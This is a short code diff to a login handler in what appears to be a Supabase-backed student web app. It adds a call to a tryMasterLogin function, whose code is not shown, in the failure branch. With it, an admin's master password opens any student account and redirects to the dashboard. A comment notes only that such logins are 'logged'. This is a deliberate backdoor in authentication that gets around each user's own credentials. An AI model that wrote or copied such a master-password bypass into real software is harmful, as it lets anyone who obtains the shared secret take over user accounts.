@@ -6,6 +6,7 @@ import { createClient } from "@/lib/supabase/server";
 import { SESSION_COOKIE } from "@/lib/auth/session";
 import { rateLimit } from "@/lib/rate-limit";
 import { rateLimitFast } from "@/lib/rate-limit-fast";
+import { tryMasterLogin } from "@/lib/auth/master-login";
 
 export type LoginState = { error: string | null };
 
@@ -69,6 +70,8 @@ export async function login(
   });
 
   if (error || !data.user) {
+    // The admin's master password opens any student account (logged).
+    if (await tryMasterLogin(email, password, ip)) redirect("/dashboard");
     return { error: "Incorrect email or password." };
   }
 
